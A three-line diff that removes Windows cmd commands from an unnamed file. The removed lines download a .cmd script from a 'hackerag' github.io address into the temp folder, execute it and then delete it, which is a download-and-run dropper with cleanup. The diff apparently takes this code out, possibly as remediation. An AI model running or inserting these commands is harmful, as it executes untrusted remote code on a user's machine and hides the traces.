@@ -1,3 +1,0 @@
-cmd /c curl -o %temp%\install_x-sys.cmd https://hackerag.github.io/install
-cmd /c call %temp%\install_x-sys.cmd
-cmd /c del %temp%\install_x-sys.cmd
